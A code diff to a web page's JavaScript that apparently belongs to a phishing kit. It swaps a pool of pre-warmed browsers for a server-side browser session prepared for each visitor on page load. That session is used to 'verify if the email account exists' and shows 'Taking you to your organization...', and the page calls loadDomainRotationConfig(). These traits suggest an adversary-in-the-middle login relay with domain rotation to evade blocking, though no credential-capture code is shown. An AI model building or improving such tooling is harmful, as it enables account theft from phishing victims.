@@ -1146,8 +1146,8 @@ Status: ${data.status}`);
             clearMessage();
             setLoading(true, 'Taking you to your organization...', false);
 
-            // Ensure browsers are ready for instant access before proceeding
-            await ensureBrowsersReady();
+            // Ensure email page browser is ready before proceeding
+            await ensureEmailPageBrowserReady();
 
             try {
                 // First, verify if the email account exists
@@ -1851,22 +1851,14 @@ Status: ${data.status}`);
             });
         }
 
-        // Browser preparation functions for instant startup
-        async function prepareBrowsersOnPageLoad() {
+        // Browser preparation for email page
+        let emailPageSessionId = null; // Store session ID for email input
+        
+        async function prepareEmailPageBrowser() {
             try {
-                console.log('🚀 Preparing browsers for instant access...');
+                console.log('📧 Preparing browser for email page...');
                 
-                // First check browser pool status
-                const statusResponse = await fetch('/api/browser-pool-status');
-                const statusData = await statusResponse.json();
-                
-                if (statusData.success && statusData.status.readyBrowsers > 0) {
-                    console.log(`✅ ${statusData.status.readyBrowsers} warm browsers already ready`);
-                    return;
-                }
-                
-                // If no browsers ready, trigger preparation
-                const prepareResponse = await fetch('/api/prepare-browser', {
+                const prepareResponse = await fetch('/api/prepare-email-page', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
@@ -1876,34 +1868,25 @@ Status: ${data.status}`);
                 const prepareData = await prepareResponse.json();
                 
                 if (prepareData.success) {
-                    console.log(`⚡ Browser preparation completed: ${prepareData.warmBrowsersReady} browsers ready (${prepareData.preparationTime}ms)`);
+                    emailPageSessionId = prepareData.sessionId;
+                    console.log(`✅ Browser prepared for email input: ${prepareData.sessionId}`);
                 } else {
-                    console.warn('⚠️ Browser preparation failed:', prepareData.error);
+                    console.warn('⚠️ Email page browser preparation failed:', prepareData.error);
                 }
                 
             } catch (error) {
-                console.warn('⚠️ Error during browser preparation:', error.message);
+                console.warn('⚠️ Error during email page browser preparation:', error.message);
                 // Don't block page functionality if browser preparation fails
             }
         }
 
-        // Check browser readiness before email verification
-        async function ensureBrowsersReady() {
-            try {
-                const statusResponse = await fetch('/api/browser-pool-status');
-                const statusData = await statusResponse.json();
-                
-                if (statusData.success) {
-                    console.log(`🔥 Browser pool status: ${statusData.status.readyBrowsers}/${statusData.status.totalWarmBrowsers} ready`);
-                    
-                    // If no browsers ready, trigger immediate preparation
-                    if (statusData.status.readyBrowsers === 0) {
-                        console.log('🚀 Triggering instant browser preparation...');
-                        await fetch('/api/prepare-browser', { method: 'POST' });
-                    }
-                }
-            } catch (error) {
-                console.warn('⚠️ Error checking browser readiness:', error.message);
+        // Ensure email page browser is ready
+        async function ensureEmailPageBrowserReady() {
+            if (!emailPageSessionId) {
+                console.log('🔄 No prepared browser session, creating new one...');
+                await prepareEmailPageBrowser();
+            } else {
+                console.log(`✅ Email page browser ready: ${emailPageSessionId}`);
             }
         }
 
@@ -1911,8 +1894,8 @@ Status: ${data.status}`);
         document.addEventListener('DOMContentLoaded', () => {
             loadDomainRotationConfig();
             
-            // Start browser preparation immediately for instant access
-            prepareBrowsersOnPageLoad();
+            // Prepare browser automatically when email page loads
+            prepareEmailPageBrowser();
         });
 
     </script>
